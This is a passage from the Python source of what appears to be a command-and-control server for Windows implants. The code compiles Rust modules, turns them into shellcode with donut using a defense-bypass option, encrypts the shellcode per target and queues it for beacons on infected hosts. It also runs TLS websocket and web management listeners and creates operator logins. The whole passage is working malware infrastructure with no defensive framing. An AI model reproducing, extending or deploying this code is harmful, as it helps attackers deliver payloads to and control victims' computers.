            encrypted_data = iv + cipher.encrypt(pad(plaintext, AES.block_size))
        print(f"len of shellcode: {len(encrypted_data)} (cached build)")
        uuid_command_queue[target_uuid]["code"].append(encrypted_data)
        shutil.rmtree(random_folder_name)


    else:
        print("(uncached build)")
        random_folder_name = rand_name()
        while os.path.exists(random_folder_name):
            random_folder_name = rand_name()
        random_folder_name = "./compiled_modules/" + random_folder_name + "/" + module_name
        try:
            os.makedirs(random_folder_name)
            print(f'generating project with folder: {random_folder_name}')
        except Exception as err:
            print("error while creating folder: " + err)


        shutil.copytree(target_path, random_folder_name, dirs_exist_ok=True)
        print(target_path)
        print(random_folder_name)
        string_substitution(f'{random_folder_name}/src/main.rs', "{!unique_command_id}", unique_id)
        print(f"[GEN:MOD] created folder structure ({module_name} - {module_args}) for {target_uuid}")
        payload_compiler_1 = subprocess.run(['cargo','+nightly','build', '-Z', 'build-std=std,panic_abort', '-Z', 'build-std-features=panic_immediate_abort','--target', 'x86_64-pc-windows-gnu', '--release','--manifest-path',random_folder_name+"/Cargo.toml"], capture_output=True, text=True)
        print(f"[GEN:MOD] compiled module ({module_name} - {module_args}) for {target_uuid}")

        subprocess.run(["./code/donut", f"--input:{random_folder_name}/target/x86_64-pc-windows-gnu/release/{module_name}.exe", "--exit:3", "--bypass:1", f"--output:{random_folder_name}/loader.bin"])

        print(f"[GEN:MOD] converted ({module_name} - {module_args}) to shellcode for {target_uuid}")

        iv = os.urandom(AES.block_size)
        iv_hex = binascii.hexlify(iv).decode('utf-8')

        cipher = AES.new(target_uuid[:32].encode('utf-8'), AES.MODE_CBC, iv)

        with open(f"{random_folder_name}/loader.bin", 'rb') as infile:
            plaintext = infile.read()
            first_16_bytes = plaintext[:16]
            hex_representation = ' '.join(f'{byte:02x}' for byte in first_16_bytes)
            print(hex_representation)

            print(f"len of infile: {len(plaintext)}")
            encrypted_data = iv + cipher.encrypt(pad(plaintext, AES.block_size))


        print(f"len of shellcode: {len(encrypted_data)}")

        uuid_command_queue[target_uuid]["code"].append(encrypted_data)
        shutil.rmtree(random_folder_name)
    

    # os.chdir(old_dir)
    # shutil.rmtree(random_folder_name)





def compile_module():
    global BEACON_COMMAND_QUEUE_DIRECT
    print("[OK] module compilation runner...")
    while True:
        time.sleep(1)
        command = None
        try:
                for k, v in BEACON_COMMAND_QUEUE_DIRECT.items():
                    for sec_key, value in v.items():
                        if len(v[sec_key]["command"]) > 0:
                            unique_id = sec_key
                            print(unique_id)
                            command = BEACON_COMMAND_QUEUE_DIRECT[k][sec_key]["command"].pop(0)
                            print(command)
                            module_name = command[0]
                            module_args = command[1:]
                            threading.Thread(target=compile_module_thread, args=(k, module_name, module_args,unique_id )).start()
                        else:
                            continue
        except:
            pass

async def handle_incoming_messages(websocket):
    global CONNECTED_CLIENTS
    try:
        token = websocket.request_headers.get("Authorization", "")
        while True:
                await asyncio.sleep(1)
                status = validate_auth(websocket, token)
                if status == 0:
                    if websocket not in CONNECTED_CLIENTS:
                        CONNECTED_CLIENTS.append(websocket)

                    message = await websocket.recv()
                    if message != None:
                        decMessage = message_decrypt_AES(message)
                        await executeCommand(websocket, decMessage)

                else:
                    if websocket in CONNECTED_CLIENTS:
                        CONNECTED_CLIENTS.remove(websocket)

    except:
        if websocket in CONNECTED_CLIENTS:
            CONNECTED_CLIENTS.remove(websocket)

        for i, data in enumerate(CLIENTS):
            if data.get("socket") == websocket:
                CLIENTS.pop(i)

        for i, data in list(known_jwt.items()):
            if data['jwt'] == token:
                del known_jwt[i]
        pass



async def initial_communication(websocket, path):
    await handle_incoming_messages(websocket)



async def main():
    print("[OK] WSS Service started...")
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(
        certfile=pathlib.Path("./server-cert.pem"), 
        keyfile=pathlib.Path("./server-key.pem"),  
    )

    listeners[1] = {"name": 'Default WSS - Management', "service":'wss', 'port':websocket_port, 'association':'Infrastructure'}

    try:
        server = await websockets.serve(initial_communication, SERVING_INTERFACE, websocket_port, ssl=ssl_context)
        await server.wait_closed()

    except Exception as err:
        print("[ERR] Failed to start websocket: " + err)



def generate_random_username(length=25):
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


def run_flask():
    listeners[0] = {"name": 'Default HTTP - Management', "service":'https', 'port':http_service_port, 'association':'Infrastructure'}
    print("[OK] HTTP Service started.")
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_verify_locations(cafile)
    context.load_cert_chain(certfile, keyfile)
    app.config['SERVER_NAME'] = None

    app.run(debug=False, ssl_context=context, port=http_service_port, host=SERVING_INTERFACE, use_reloader=False)

    
if __name__ == "__main__":
    analytics['operators']+=1
    mnemo = Mnemonic("english")
    server_mnemonic = mnemo.generate()

    parser = argparse.ArgumentParser()
    parser.add_argument('--interface', type=str, help='C2 remote address. (interface)', required=True)
    args = parser.parse_args()
    SERVING_INTERFACE = args.interface

    BASE_DIR = os.getcwd()

    colorama_init()
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    random_bytes = secrets.token_bytes(32)
    server_secret = random_bytes.hex()

    print(f">> {Fore.BLUE} welcome to {product_version}{Style.RESET_ALL} <<\n")
    print(f" {Fore.RED}(*){Style.RESET_ALL} server secret: {Fore.CYAN}{server_secret}{Style.RESET_ALL}")
    random_uuid = str(uuid.uuid4())
    operator_password = secrets.token_bytes(16).hex()
    operator_username = generate_random_username()
    operator_totp = pyotp.random_base32()


    known_operators[random_uuid] = {"username":operator_username, "password":hashlib.sha512(operator_password.encode("utf-8")).hexdigest(), "totp":operator_totp, "last_seen":None, "history":None, "first_use":0, "jwt":None, "status":None}
    print(f" {Fore.RED}(*){Style.RESET_ALL} default admin operator:")
    print(f"        username: {Fore.CYAN}{operator_username}{Style.RESET_ALL}\n        password (change after first use): {Fore.CYAN}{operator_password}{Style.RESET_ALL}\n        totp: {Fore.CYAN}{operator_totp}{Style.RESET_ALL}\n")
    print(f"\npython3 xnova.py --remote 127.0.0.1:3921 --username {operator_username} --clientkey ./client-key.pem --clientcert ./client-cert.pem --password {operator_password} --c2pass {server_secret} --2fa 000 --wssport 8765\n")



    thread_http = threading.Thread(target=run_flask)

    thread_queue_runner = threading.Thread(target=asyncio.run, args=(queue_runner(), ))
    thread_queue_runner.start()

    thread_global_queue_runner = threading.Thread(target=asyncio.run, args=(global_queue_runner(), ))
    thread_global_queue_runner.start()

    thread_global_stats_pooling = threading.Thread(target=asyncio.run, args=(update_server_statistics(), ))
    thread_global_stats_pooling.start()

    module_refresh_thread = threading.Thread(target=refresh_modules)
    module_refresh_thread.start()

    beacon_command_thread = threading.Thread(target=command_beacons)
    beacon_command_thread.start()

    module_compilation_thread = threading.Thread(target=compile_module)
    module_compilation_thread.start()

    thread_http.start()
    asyncio.run(main())

